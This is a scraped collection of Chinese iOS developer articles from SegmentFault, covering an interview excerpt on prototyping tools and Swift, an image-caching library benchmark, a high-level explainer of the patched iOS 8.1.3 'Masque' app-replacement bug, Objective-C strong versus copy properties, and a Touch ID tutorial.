  <p>是，我得说它们确实让人激动。不过当我们谈论让我真正感到激动的东西，它并不再消费软件工程行业。但是就能帮助我完成工作的工具而言，我感到最兴奋的品类是真正的交互式原型工具，比如你要做以前从来不存在的工具，或者之前有过概念但是还没有工具能真正实现交互。所以我们大部分人依旧只在Photoshop中进行设计而已，当你在Photoshop中设计时，你创造的东西看起来就像是Photoshop的产物。我记得之前在Apple，我能看得出来自于Photoshop、After Effects还是现实模型的不同需求的区别，这之间有很大的区别。现在已经有一些工具能够实现这一点，我想它们都还没有绝对成熟完善，但我很热忱地关注着这些进步，也希望能有所贡献。</p>
</blockquote>

<h3>你是指像Farmer这样的工具吗？</h3>

<blockquote>
  <p>是阿，Farmer是一个非常不错的例子。我对刚被Google收购的Form很感兴趣，以及Origami，当然也很有趣。我在苹果参与了一个原型工具的内部项目，它再一些方面更好一些，在一些方面又稍逊一筹。每个工具都有它的优缺点。实际上我们还编排了一个关于「你可以用这个工具干这个，你可以用这个工具干那个」，后来我们发现我们不得不来回挑选。我感觉除非它们做已有工具在做的事情，否则它们并没有在其他方面有特别优秀的表现。</p>
</blockquote>

<h3>你觉得storyboards是不是也往这个方向发展？</h3>

<blockquote>
  <p>实际上我不这么看，但我得解释一下。关于交互，现在有离散模式和连续模式。像鼠标点击这一类交互就是离散模式的交互而手势这一类交互就是连续模式的交互。相似地，你的应用也有离散状态和连续状态。例如滚动就是连续的而导航堆栈中导航到其他层级就是离散的。<br>
      Storyboards只允许你操作控制那个四方形中的离散部分，因此当你点击屏幕上的一个部位，你就能通过离散转换到完全不同的地方。但是我发现这是最没有意思的交互方式，坦诚来讲我认为我们的用户接口主要被那样的交互方式所控制是因为我们没有工具允许我们思考其他的交互方式。<br>
      但是从iOS 7起，这种离散模式的边界也逐渐变得模糊。举个比方，点击一个单元格的时候能够展开单元格以下的内容。这是非常琐碎的例子，然而storyboard却很难呈现。</p>
</blockquote>

<h3>我们需要更多像Bret Victor这样的人来解决这类问题。</h3>

<blockquote>
  <p>确实，这也是为什么我希望少些人来做照片分享类的app。</p>
</blockquote>

<h3>你之前提到消费类软件工程不是你感兴趣的领域，那么这个领域之外你感兴趣的是？</h3>

<blockquote>
  <p>我读了不同领域的很多论文，至今我仍在思考这件事。就目前我最感兴趣的是幼儿成长或教育、教学模式。最让我激动的是我读到一篇调查，一个只有五岁孩子的班级，老师并没有进行常规的数学教学，而是通过不断改变的一系列活动来塑造学习环境进行施教，这些活动都是游戏。一年以后，他们的评估表明尽管他们没有受到正式的算术教学，但是他们都能答对问题而且具备优秀的认知。这件事真的让我非常激动。</p>
</blockquote>

<h3>所以你在可汗学院工作依赖，学到的最重要的事是什么？</h3>

<blockquote>
  <p>带团队可不容易…</p>
</blockquote>

<h3>为什么呢？</h3>

<blockquote>
  <p>这是一项我没有经验、且截然不同的技能。在软件行业里，我们总是让有所贡献的工程师去担当领导的角色，并期待他们能表现优异，显然这是截然不同的技能，因此我们必须要清楚这点并加以欣赏。这里头有很多学问。</p>
</blockquote>

<h3>你提到过你在Apple有很好的导师，是什么让他们如此优秀以及你又从他们那儿学到了什么？</h3>

<blockquote>
  <p>首先他们愿意慷慨地花之间来指导我。在Apple挑战总是无处不在，但Apple的问题在于它的文化并不看重导师的价值。没有奖励机制，而且指导和学习也没有融入到企业文化中。<br>
      但不管怎样，我真的太幸运能有人愿意花很多时间来指导我，而且当我在项目中犯了极其严重的错误的时候他们也会花时间来指导我。那么，是什么提高了效率？应该是他们的经验吧。现在这个行业是个有趣的领域，因为这里充斥了应届生，也正是这些应届生在Twitter发声、在会议上演讲。但是这个行业的形成又不是这一时半刻，肯定有很多在这个领域具备15到20年专业经验的软件工程师，他们很少发声，甚至你很难督导他们的文章。因为他们被公司雪藏，因此他们不为人知，但他们肯定懂得很多。</p>
</blockquote>

<h3>在可汗学院，你与你的团队很快就适应了Swift，你能和我们分享一些经验吗？</h3>

<blockquote>
  <p>我们拥有20000行的Swift代码，以及每个项目都有四个开发者，都用Swift进行编译。所以那些问题或者我们称之为问题的东西实际上是实用主义与理想主义的冲突。我确信语言自身的问题只是暂时的，实际上它们并不会造成宏观层面的影响；对于你在六个月内做出的app来讲，这些问题同样不重要，因此尽管忽略我的抱怨。<br>
      只要专业软件开发以及生态系统能够长期健康发展，我想这门语言会是非常卓越的贡献，而头几个月的跌跌撞撞根本不算什么。<br>
      从积极的一面来说，Swift帮助我们写出更清晰的代码。这是我读Swift接口时感到最高兴的事。当我读Swift的block代码时，我对正在发生的以及即将发生的有了更清晰的理解。我可以看到返回值并且能从中理解更多。我能使用枚举法来更精准地为系统状态建模：更精确的是，我们可以使用值类型来约束、限制从属关系；更宽泛的是，我赞同把UIKit当做库而不是框架的模式。<br>
      就问题而言，如果没有工具，工程师也没有去深入解析。实际上我恰巧觉得Swift开发团队是Apple里最棒的队伍，但是它还没完成。现在它都是bug，经常崩溃，时不时还产生错误的代码。更为要紧的是，它真的好慢，相当相当慢。对我而言，缺少增长式编译是目前最大的问题。我们构建一个有UI的应用，我们得花上与思考如何促进学习一样的时间来打磨应用的交互和动画。而且每次要花上将近两分钟的时间才能看到效果真的太伤了，这不仅效率低下，还挫败士气。每个人总是生气。更糟糕的是，它让我们变得懈怠。我们不再想去做改动，所以我丝毫不会惊讶于Swift实现的UI比Objective-C实现的UI效果更差，因为这上面的迭代简直让人抓狂。但这是暂时的，其实我丝毫不担心。他们清楚这些问题而且会去修复。只是我们没有办法很好地管理预期，不是出于恶意地，但是我确实觉得苹果之前不了解这些问题而且没有做过这么大型东西的经验。</p>
</blockquote>

<h3>你觉得Swift会对Apple框架的API带来什么样的影响？短期内你期待会有什么变化吗？</h3>

<blockquote>
  <p>显然实际上我没有什么内部确切信息，我也只是猜测而已，但我想这会是个长期公称。至少当我在苹果的时候，团队花了大把时间来支持诸如新屏幕尺寸或者新硬件的市场需求，而不是维护和提升现有框架。那些工作已经花了大把时间了，所以做任何重要举动时都要慎重考虑，所以我不认为这会很快就来。<br>
      我认为我们快进到未来的十年后，API将会完全不一样。我坚信这会实现，否则会让人极其失望。即使是一年以后，我想你们也一定能拿到更优注释的头文件。</p>
</blockquote>

<h3>或者我们能有像Reactive Cocoa那样的人，把它包装地更好看一些？</h3>

<blockquote>
  <p>没错，短时间内一定会有的。Facebook现在就在做他们的组件项目（Component project），不过这不是Swift，是C++，我觉得这很勇敢，想法很赞。React是很不错的设计。而我对苹果的怨言之一也正在此，因为苹果的文化不评估学习的价值，因此没有人阅读。我其实是借鉴当科学家讨论阅读时他们所表达的意思。现在没有人读刊物，没有人读报纸，没有人知道外面在发生什么。正如人们不知道React以及诸如此类的东西，这可真让人沮丧阿。<br>
      不管怎样，我认为它们都是非常赞的事物而且我坚信会有人把UIKit以及其他框架当做库来对待并把它们包装得更好。然而，除非苹果亲自来做，否则不会被良好的适应，它们会总是落后并且感觉很不匹配。</p>
</blockquote>

<h3>自打你离开苹果后，你也完成了更多写作与演讲方面的事。除此之外你还有什么其他的计划吗？</h3>

<blockquote>
  <p>基本上还是那样。我希望可以发布更多开源的东西，过去我在这上头有过教训。不过相当有趣的是，当你发布开源项时，人们还期望你能维护它。我想我们对大众对开源软件的期待没有明确的约定。有一些开源软件有自身的社区能被很好地维护，而有一些开源软件仅是作为教育或兴趣的目的被分享，就没有被真正地维护。至于我，基本上只有精力做到后者，因为，坦诚来说，软件工程目前不是我感兴趣的，要努力解决问题的部分。</p>
</blockquote>

<p>（完）</p>

                ", 【翻】终身学习的一代人,1531972141,294,1,88,1,1,https://segmentfault.com/a/1190000002540613
167,1,0,6,"
                    
<h2>1. 引言</h2>

<p>过去的几年里，iOS 应用在视觉方面越来越吸引人。图像展示是其中很关键的部分，因为大部分图像展示都需要下载并且渲染。大部分开发者都要使用图像填充表格视图（table views）或者集合视图（collection views）。下载图片消耗一些资源（如蜂窝数据、电池以及 CPU 等）。为了减少资源消耗，一些缓存模型也应运而生。</p>

<p>为了获得良好的用户体验，当我们缓存和加载图像时，了解 iOS 底层如何处理是很重要的。此外，大多数使用了图片缓存的开源库也是个不错解决方案。</p>

<h2>2. 常用的解决途径</h2>

<ul>
<li>异步下载图像 </li>
<li>处理图像（拉伸，去红眼，去边框）以便展示</li>
<li>写入磁盘</li>
<li>需要时从磁盘读取并展示</li>
</ul>
<pre><code>    // 假设我们有一个 NSURL *imageUrl and UIImageView *imageView, 我们需要通过NSURL下载图片并在UIImageview上展示
    if ([self hasImageDataForURL:imageUrl] {
        NSData *data = [self imageDataForUrl:imageUrl];
        UIImage *image = [UIImage imageWithData:imageData];
        dispatch_async(dispatch_get_main_queue(), ^{
            imageView.image = image;
        });
    } else {
        [self downloadImageFromURL:imageUrl withCompletion:^(NSData *imageData, …) {
            [self storeImageData:imageData …];
            UIImage *image = [UIImage imageWithData:imageData];
            dispatch_async(dispatch_get_main_queue(), ^{
                imageView.image = image;
            });
        }];
    }
</code></pre>

<p>FPS 简介</p>

<ul>
<li>UI 渲染理想情况 FPS=60</li>
<li>60FPS =&gt; 16.7ms 每帧，这就意味着如果任何主线程操作大于 16.7ms，动态 FPS 将会下降，因为 CPU 忙于处理其他事情，而不是渲染 UI。</li>
</ul>
<h2>3. 常用解决途径的缺点</h2>

<ul>
<li>从磁盘加载图像或文件时间消耗昂贵（磁盘读取比内存读取慢大概 10-1000 倍，如果是 SSD 硬盘，则可能与内存读取速度更接近（大概慢 10 倍）。参考这里的比较：<a rel=""nofollow"" href=""http://www.storagereview.com/introduction_ram_disks"">Introduction to RAM Disks</a><br>
如果使用 SSD，将获得接近内存的速度（大概比内存访问速度慢十倍），但目前还没有手机和平板集成 SSD 模块。</li>
<li>创建 UIImage 实例将会在内存区生成一个图片的压缩版。但是压缩后的图像太小且无法渲染，如果我们从磁盘加载图像，图像甚至都没有加载到内存。解压图片同样也很消耗资源。</li>
<li>设置 imageView 的 image 属性，这种情况下将会创建一个 CATransaction 并加入主循环中。在下一次循环迭代中，CATransaction 会对任何设置为 <code>layer contents</code> 的图像进行拷贝。 </li>
</ul>
<p>拷贝图像包含以下过程：</p>

<ul>
<li>给文件 io 和解压缩分配缓冲区</li>
<li>读取磁盘数据到内存</li>
<li>解压图像数据（生成原位图） - 高 CPU 消耗</li>
<li>CoreAnimation 使用解压数据并渲染</li>
</ul>
<p>字节位没有正确对齐的图像将被 CoreAnimation 拷贝，以修复字节位对齐并使之能被渲染。这一点在 Apple 文档里没有说明，但是使用 Instruments 表明 <code>CA::Render::copy_image</code> 会执行此操作，即使 Core Aniation 即使没有拷贝图像。</p>

<p>从 iOS7 开始，第三方应用不能使用JPEG硬件解码器。这意味着我们只能使用慢很多的软解码器。这一点在 FastImageCache 团队的 <a rel=""nofollow"" href=""https://github.com/path/FastImageCache#the-problem"">GitHub 主页</a>以及 <a rel=""nofollow"" href=""https://twitter.com/nicklockwood/status/401128101049942016"">Nick Lockwood 的推文</a>上都有指出。</p>

<h2>4. 一个强大的 iOS 图像缓存需包含以下部分：</h2>

<ul>
<li>异步下载图像，尽可能减少使用主线程队列</li>
<li>使用后台队列解压图像。这是个复杂的过程，请阅读 <a rel=""nofollow"" href=""http://www.cocoanetics.com/2011/10/avoiding-image-decompression-sickness/"">Avoiding Image Decompression Sickness</a>
</li>
<li>在内存和磁盘上缓存图像。在磁盘上缓存图像很重要，因为 App 可能因为内存不足而被强行关闭或者需要清理内存。这种情况下，重新从磁盘加载图像比下载会快很多。<br>
备注：如果使用 NSCache 作为内存缓存，当有内存警告时，NSCache 会清空缓存内容。NSCache 相关细节请查看 <a rel=""nofollow"" href=""http://www.cocoachina.com/ios/20150128/11053.html"">nshipster 文章：NSCache</a>  </li>
<li>保存解压过的图片到硬盘以及内存中，以避免再次解压。</li>
<li>使用 GCD 和 blocks，这将使得代码更加高效和简单，如今 GCD 和 blocks 是异步操作时必需的。</li>
<li>最好使用 UIImageView 的分类以便集成</li>
<li>最好在下载后以及存入到缓存前能够处理图像</li>
</ul>
<h3>iOS图像优化</h3>

<p>更多的成像相关以及 SDK 框架（CoreGraphics, ImageIO, CoreAnimation, CoreImage)工作原理，CPU vs GPU 等，请阅读 @rsebbe 的文章：<a rel=""nofollow"" href=""http://www.slideshare.net/rsebbe/2014-cocoaheads-advimaging"">Advanced Imaging on iOS</a></p>

<h3>Core Data 是一个好的选择吗？</h3>

<p>这有一篇文章--CoreData 对比 File System，<a rel=""nofollow"" href=""http://biasedbit.com/filesystem-vs-coredata-image-cache/"">实现图像缓存的基准测试</a>，结果 File System 的表现更好。</p>

<p>看一看上面罗列的观点，自己实现图像缓存不仅复杂，耗时而且痛苦。这也是为什么我倾向于使用开源的图像缓存解决方案，你们大部分已经听说过 SDWebImage 或 new FastImageCache。</p>

<p>为了让你知道哪个开源库最适合你，我做了测试并且分析它们如何满足上述要求。</p>

<h2>5. 基准测试</h2>

<p>测试库：</p>

<ul>
<li>
<a rel=""nofollow"" href=""https://github.com/rs/SDWebImage"">SDWebImage</a> - version <a rel=""nofollow"" href=""https://github.com/rs/SDWebImage/releases/tag/3.5.4"">3.5.4</a>
</li>
<li>
<a rel=""nofollow"" href=""https://github.com/path/FastImageCache"">FastImageCache</a> - version <a rel=""nofollow"" href=""https://github.com/path/FastImageCache/releases/tag/1.2"">1.2</a>
</li>
<li>
<a rel=""nofollow"" href=""https://github.com/AFNetworking/AFNetworking"">AFNetworking</a> - version <a rel=""nofollow"" href=""https://github.com/AFNetworking/AFNetworking/releases/tag/2.2.1"">2.2.1</a>
</li>
<li>
<a rel=""nofollow"" href=""https://github.com/tumblr/TMCache/"">TMCache</a> - version <a rel=""nofollow"" href=""https://github.com/tumblr/TMCache/releases/tag/1.2.0"">1.2.0</a>
</li>
<li>
<a rel=""nofollow"" href=""https://github.com/Haneke/Haneke"">Haneke</a> - version <a rel=""nofollow"" href=""https://github.com/hpique/Haneke/releases/tag/v0.0.5"">0.0.5</a>
</li>
</ul>
<p>注：AFNetworking 加入对比是由于其自iOS7后在磁盘缓存方面出色的表现（基于 NSURLCache 实现）</p>

<h3>测试场景</h3>

<p>对于每个库，我都会使用全新的测试app，然后启动app，等所有图像加载完后，慢慢滑动。然后以不同力度来回滑动（从慢到快）。接着关掉app强制应用从磁盘缓存中加载图像，最后重复以上测试场景。</p>

<h3>关于测试 App 工程</h3>

<ul>
<li><p>相关 demo 可以在 GitHub 找到并获取，名字是 <a rel=""nofollow"" href=""https://github.com/bpoplauschi/ImageCachingBenchmark"">ImageCachingBenchmark</a>，同时还有本次实验的图表、结果数据表以及更多。</p></li>
<li><p>请注意，请注意 GitHub 上的工程和图像缓存库都需要做一些调整，以便能让我们看到每一张缓存的图片都能够被加载出来。由于我不想检查 Cocoapods 源码文件（不是个好习惯），所以需要对 Cocoapods clean 后重新编译工程代码，目前 GitHub 上的版本与我做测试的版本有些差别。</p></li>
<li><p>如果你们想重新跑一下测试，你需要编写相同 completionBlock 用于图像加载，所有库得要跟默认的 SDWebImage 一样返回 SDImageCacheType。</p></li>
</ul>
<h3>最快与最慢的设备对比结果</h3>

<p>在 GitHub 工程上能看到<a rel=""nofollow"" href=""http://htmlpreview.github.io/?https://github.com/bpoplauschi/ImageCachingBenchmark/blob/master/tables/tables.html"">完整的基准测试结果</a>，由于这些表格很大，我只使用运行最快的设备 iPhone 5s 和运行最慢的 iPhone 4 来测试。</p>

<p><span class=""img-wrap""><img data-src=""/img/bVkMmR"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1422426863858832.jpg""></span><br><span class=""img-wrap""><img data-src=""/img/bVkMmU"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1422426934456714.jpg""></span><br><span class=""img-wrap""><img data-src=""/img/bVkMmV"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1422427092474726.jpg""></span><br><span class=""img-wrap""><img data-src=""/img/bVkMmY"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1422427214870488.jpg""></span></p>

<p>汇总：</p>

<p><span class=""img-wrap""><img data-src=""/img/bVkMm0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""1422425019671031.jpg""></span></p>

<p>表格名词解释：</p>

<ul>
<li>异步下载：库支持异步下载</li>
<li>后台解压：通过后台队列或线程执行图像解压</li>
<li>存储解压：存储解压后的图像版本</li>
<li>内存/磁盘缓存：支持内存/磁盘缓存</li>
<li>UIImageView 分类：库中含 UIImageView 类别</li>
<li>从内存/磁盘：从缓存（内存/磁盘）中读取的平均时间</li>
</ul>
<h2>6. 结论</h2>

<ul>
<li><p>从头开始编写 iOS 图像缓存组件很困难</p></li>
<li><p>SDWebImage 和 AFNetworking 是稳定的工程。由于有很多贡献者，这样保证代码能够及时得到维护，FastImageCache 在维护方面更新很快。</p></li>
<li><p>基于以上所有数据，我认为 SDWebImage 在目前是一个很好的解决方案。即使有些工程使用 AFNetworking 或 FastImageCache 更好，但是这些都依赖于项目需求。</p></li>
</ul>
<hr>
<p>原文：<a rel=""nofollow"" href=""https://bpoplauschi.wordpress.com/2014/03/21/ios-image-caching-sdwebimage-vs-fastimage/"">iOS image caching. Libraries benchmark (SDWebImage vs FastImageCache)</a><br>
译者：<a rel=""nofollow"" href=""https://github.com/persenlee/"">夜微眠</a><br>
校对：<a rel=""nofollow"" href=""http://blog.csdn.net/guopengzhang"">蓝魂</a>、<a rel=""nofollow"" href=""http://blog.csdn.net/u013604612"">Cocoa</a><br>
首发 <a rel=""nofollow"" href=""http://www.cocoachina.com/ios/20150128/11053.html"">CocoaChina</a></p>

<hr>
<p><span class=""img-wrap""><img data-src=""/img/bVkMnd"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

                ", iOS图片缓存库基准对比,1531972143,326,1,781,1,1,https://segmentfault.com/a/1190000002530163
168,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVkLJ0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""8.1.3""></span><br>
图片来自 <a rel=""nofollow"" href=""http://www.redmondpie.com"">http://www.redmondpie.com</a></p>

<p>最近苹果发布了8.1.3系统更新。从更新日志看，没有多少变化（错误修复，提高稳定性和性能），但是苹果修复了一个“漏洞”，就是之前说的“假面”。</p>

<h2>科普一：假面漏洞</h2>

<p>系统给每个应用一个安全区域（沙盒），一个应用没有权限获取其他应用的沙盒里的数据。每个应用有一个<code>BundleId</code>，一个假冒的应用只要具有相同的 BundleID 并且有合法权限（一般是通过合法的企业证书重新打包签名）能安装到手机上就可以直接替换掉原有的应用并且取得该应用的所有权限。</p>

<p>举个例子，手机上安装了微博的官方客户端，并且客户端曾经获得了你的批准访问手机的相册，通讯录，地理位置等等。假如有人做了个假冒应用，通过一些途径，比如黑应用商店安装到你的手机上，就会直接替换掉官方的客户端，在你打开的一瞬间就可以读完你的通讯录，应用里存的敏感信息等发送给作恶者的服务器，而你对此完全没有感知。</p>

<p>8.1.3的安全方面更新着重解决了这个问题，<a rel=""nofollow"" href=""http://support.apple.com/en-us/ht204245"">这里是详细说明</a> 。</p>

<p>修复了下面这2个关键的 bug：</p>

<ol>
<li><p>CVE-2014-4493<br>
就是前面说到的假面漏洞。</p></li>
<li><p>CVE-2014-4494<br>
通过非应用商店下载的应用，一般在打开前系统会提示，这个应用不可信，是否要信任它。这里提到的 bug 可以绕过这个系统提示。</p></li>
</ol>
<p>其他几个 bug 也很有意思，比如动态加载执行未经审核的代码，有兴趣的同学可以自行研究<code>Mach-O</code>。</p>

<h2>科普二 非官方应用商店 安装应用的实现原理</h2>

<p>为什么要从非官方的 AppStore 安装应用呢？原因大概有：</p>

<ol>
<li><p>仅在企业内部使用的应用没必要放到应用商店。比如银行等比较敏感的企业的内部管理应用，出于安全考虑不能公开给所有人下载并且即便有人下载了没有内部账号也无法使用。</p></li>
<li><p>现在的应用太多了，放到官方商店会被淹没。而官方商店又基本没有“关系后门”可以给点钱帮忙推广之类的办法，所以衍生出来各种积分墙，应用赚钱等产业靠广大人民群众的人海战术给应用刷榜，提高应用排行榜上的位置提高曝光率，达到推广的目的。如果商店控制在“自己人”手里，一切都解决了，要推荐有推荐要首发有首发。</p></li>
<li><p>官方商店的审核时间太长，而且是个不定数，好不容易排队半个月等到审核，2分钟结束，拒绝通过，然后再对应用或者是描述做修改再提交，再进行漫长的等待。</p></li>
<li><p>有些应用利用了 iOS 没公开的接口来做一下苹果目前不认可的高级功能，比如“来电防火墙”、访问 WiFi 等功能。</p></li>
<li><p>收费应用免费化，你懂得 :)</p></li>
</ol>
<p>实现原理也2种:</p>

<ol>
<li>用合法的企业证书，重新对应用打包签名。让系统以为这个应用是个大企业内部使用的应用。</li>
<li>破解<code>FairPlay</code>（DRM，苹果的版权保护方案）。通过在电脑上利用 iTunes 的权限替换手机里的用户购买信息，让手机误以为是正版用户购买的。现在市面上的各种“手机助手”基本都是用的这种方法。</li>
</ol>
<hr>
<h2>带来的影响</h2>

<p>针对破解<code>FairPlay</code>，苹果同时发布了<code>iTunes 12.1</code>，改成了64位架构，使各种助手失效，媒体把这个更新称为“各路助手挺尸”、“封杀一切助手”等。<br><span class=""img-wrap""><img data-src=""/img/bVkLJ4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""iTunes 12.1""></span><br>
图片来自 <a rel=""nofollow"" href=""http://www.redmondpie.com"">http://www.redmondpie.com</a></p>

<p>针对企业证书重签名，正常情况（指在 Xcode 里直接用企业证书编译打包签名）的企业证书签名是不受影响的，只有用企业证书做了重新打包。只有因为企业证书本身存在是为了让大企业更方便，而后来被国人玩坏了（最近被苹果大规模撤销）。</p>

<p>这个只是目前大部分的重新打包的逻辑没有跟进，估计过一段时间应该会兼容回去。但是所有的已经打过包的应用除非重新来过，否则无法安装到8.1.3上。而且企业证书经常被滥用导致苹果撤销，再用新的证书打包时又会因为上面的逻辑，而使应用无法安装。</p>

<p>所以企业证书分发应用这种方式将会在不久后退出历史舞台。</p>

<p><strong>提示：</strong> 如果出现了手机无法安装，无法下载等问题很难直接判断错误原因，开发者可以通过 FIR.im 发布的小工具 <a rel=""nofollow"" href=""http://fir.im/dev/tools"">Log Guru</a> 来查看具体的错误以便分析。<br><span class=""img-wrap""><img data-src=""/img/bVkLKr"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""FIR.im Log Guru""></span></p>

<p><strong>注1：</strong> 证书（开发者账号）有3种，个人、公司、企业， 企业证书是$299向苹果申请的仅能用于企业内部分发应用的证书，不能提交应用商店的那种，经常被误以为是公司证书。</p>

                ", iOS 8.1.3 “各路助手挺尸”、“封杀一切助手”的背后,1531972144,351,1,317,1,1,https://segmentfault.com/a/1190000002527817
169,1,0,6,"
                    
<h1>strong和copy的区别</h1>

<h4>问题描述</h4>

<p>在定义一个类的property时候，为property选择<strong>strong</strong>还是<strong>copy</strong>特别注意和研究明白的，如果property是NSString或者NSArray及其子类的时候，最好选择使用copy属性修饰。为什么呢？这是为了防止赋值给它的是可变的数据，如果可变的数据发生了变化，那么该property也会发生变化。</p>

<h4>代码示例</h4>

<p>还是结合代码来说明这个情况</p>

<pre><code>@interface Person : NSObject
@property (strong, nonatomic) NSArray *bookArray1;
@property (copy, nonatomic) NSArray *bookArray2;
@end

@implementation Person
//省略setter方法
@end

//Person调用
main(){
    NSMutableArray *books = [@[@""book1""] mutableCopy];
    Person *person = [[Person alloc] init];
    person.bookArray1 = books;
    person.bookArray2 = books;
    [books addObject:@""book2""];
    NSLog(@""bookArray1:%@"",person.bookArray1);
    NSLog(@""bookArray2:%@"",person.bookArray2);
}
</code></pre>

<p>我们看到，使用strong修饰的person.bookArray1输出是[book1,book2]，而使用copy修饰的person.bookArray2输出是[book1]。这下可以看出来区别了吧。</p>

<blockquote>
  <p>备注：使用strong，则person.bookArray1与可变数组books指向同一块内存区域，books内容改变，导致person.bookArray1的内容改变，因为两者是同一个东西；而使用copy，person.bookArray2在赋值之前，将books内容复制，创建一个新的内存区域，所以两者不是一回事，books的改变不会导致person.bookArray2的改变。</p>
</blockquote>

<p>说到底，其实就是不同的修饰符，对应不同的setter方法，<br>
1. strong对应的setter方法，是将_property先release（_property release），然后将参数retain（property retain），最后是_property = property。<br>
2. copy对应的setter方法，是将_property先release（_property release），然后拷贝参数内容（property copy），创建一块新的内存地址，最后_property = property。</p>

                ", Objective-C属性修饰符strong和copy的区别,1531972146,282,1,931,1,1,https://segmentfault.com/a/1190000002520583
170,1,0,6,"
                    
<h1>基础知识</h1>
<h2>支持系统和机型</h2>
<p>iOS系统的指纹识别功能最低支持的机型为<code>iPhone 5s</code>，最低支持系统为<code>iOS 8</code>，虽然安装<code>iOS 7</code>系统的5s机型可以使用系统提供的指纹解锁功能，但由于<code>API</code>并未开放，所以理论上第三方软件不可使用。</p>
<h2>依赖框架</h2>
<p><code>LocalAuthentication.framework</code></p>
<pre><code class=""objc"">#import &lt;LocalAuthentication/LocalAuthentication.h&gt;</code></pre>
<h2>注意事项</h2>
<p>做<code>iOS 8</code>以下版本适配时，务必进行API验证，避免调用相关API引起崩溃。</p>
<h2>使用类</h2>
<p><code>LAContext</code> 指纹验证操作对象</p>
<h1>代码</h1>
<pre><code class=""objc"">- (void)authenticateUser
{
    //初始化上下文对象
    LAContext* context = [[LAContext alloc] init];
    //错误对象
    NSError* error = nil;
    NSString* result = @""Authentication is needed to access your notes."";
    
    //首先使用canEvaluatePolicy 判断设备支持状态
    if ([context canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&amp;error]) {
        //支持指纹验证
        [context evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics localizedReason:result reply:^(BOOL success, NSError *error) {
            if (success) {
                //验证成功，主线程处理UI
            }
            else
            {
                NSLog(@""%@"",error.localizedDescription);
                switch (error.code) {
                    case LAErrorSystemCancel:
                    {
                        NSLog(@""Authentication was cancelled by the system"");
                        //切换到其他APP，系统取消验证Touch ID
                        break;
                    }
                    case LAErrorUserCancel:
                    {
                        NSLog(@""Authentication was cancelled by the user"");
                        //用户取消验证Touch ID
                        break;
                    }
                    case LAErrorUserFallback:
                    {
                        NSLog(@""User selected to enter custom password"");
                        [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                            //用户选择输入密码，切换主线程处理
                        }];
                        break;
                    }
                    default:
                    {
                        [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                           //其他情况，切换主线程处理 
                        }];
                        break;
                    }
                }
            }
        }];
    }
    else
    {
        //不支持指纹识别，LOG出错误详情
        
        switch (error.code) {
            case LAErrorTouchIDNotEnrolled:
            {
                NSLog(@""TouchID is not enrolled"");
                break;
            }
            case LAErrorPasscodeNotSet:
            {
                NSLog(@""A passcode has not been set"");
                break;
            }
            default:
            {
                NSLog(@""TouchID not available"");
                break;
            }
        }
        
        NSLog(@""%@"",error.localizedDescription);
    }
}
</code></pre>
<pre><code class=""objc"">typedef NS_ENUM(NSInteger, LAError)
{
    //授权失败
    LAErrorAuthenticationFailed = kLAErrorAuthenticationFailed,
    
    //用户取消Touch ID授权
    LAErrorUserCancel           = kLAErrorUserCancel,
    
    //用户选择输入密码
    LAErrorUserFallback         = kLAErrorUserFallback,
    
    //系统取消授权(例如其他APP切入)
    LAErrorSystemCancel         = kLAErrorSystemCancel,
    
    //系统未设置密码
    LAErrorPasscodeNotSet       = kLAErrorPasscodeNotSet,

    //设备Touch ID不可用，例如未打开
    LAErrorTouchIDNotAvailable  = kLAErrorTouchIDNotAvailable,
    
    //设备Touch ID不可用，用户未录入
    LAErrorTouchIDNotEnrolled   = kLAErrorTouchIDNotEnrolled,
} NS_ENUM_AVAILABLE(10_10, 8_0);</code></pre>
<h2>操作流程</h2>
<p>首先判断系统版本，<code>iOS 8</code>及以上版本执行<code>-(void)authenticateUser</code>方法，方法自动判断设备是否支持和开启<code>Touch ID</code>。</p>
<h2>iOS 9</h2>
<p>感谢<a href=""http://segmentfault.com/u/mohuifen"" rel=""nofollow noreferrer"">秋儿</a>指出iOS 9加入了三种新的错误类型。</p>
<pre><code> /// Authentication was not successful, because there were too many failed Touch ID attempts and
    /// Touch ID is now locked. Passcode is required to unlock Touch ID, e.g. evaluating
    /// LAPolicyDeviceOwnerAuthenticationWithBiometrics will ask for passcode as a prerequisite.
    LAErrorTouchIDLockout   NS_ENUM_AVAILABLE(10_11, 9_0) = kLAErrorTouchIDLockout,

    /// Authentication was canceled by application (e.g. invalidate was called while
    /// authentication was in progress).
    LAErrorAppCancel        NS_ENUM_AVAILABLE(10_11, 9_0) = kLAErrorAppCancel,

    /// LAContext passed to this call has been previously invalidated.
    LAErrorInvalidContext   NS_ENUM_AVAILABLE(10_11, 9_0) = kLAErrorInvalidContext</code></pre>
<p>其中，<code>LAErrorTouchIDLockout</code>是在8.0中也会出现的情况，但并未归为单独的错误类型，这个错误出现，源自用户多次连续使用Touch ID失败，Touch ID被锁，需要用户输入密码解锁，这个错误的交互<code>LocalAuthentication.framework</code>已经封装好了，不需要开发者关心。</p>
<p><code>LAErrorAppCancel</code>和<code>LAErrorSystemCancel</code>相似，都是当前软件被挂起取消了授权，但是前者是用户不能控制的挂起，例如突然来了电话，电话应用进入前台，APP被挂起。后者是用户自己切到了别的应用，例如按home键挂起。</p>
<p><code>LAErrorInvalidContext</code>很好理解，就是授权过程中,LAContext对象被释放掉了，造成的授权失败。</p>

                ", iOS Touch ID 简易开发教程,1531972148,470,1,961,1,1,https://segmentfault.com/a/1190000002516465
171,1,0,6,"
                    
<p>再好的应用，也需要有人去发现他，我只是有那么一些途径，让我更快的找到它们而已。有网页，有微博，也有微信公众号，希望我的这些推荐可以让你更好的发现那些优秀、精美的应用。</p>

<h3>AppZapp</h3>
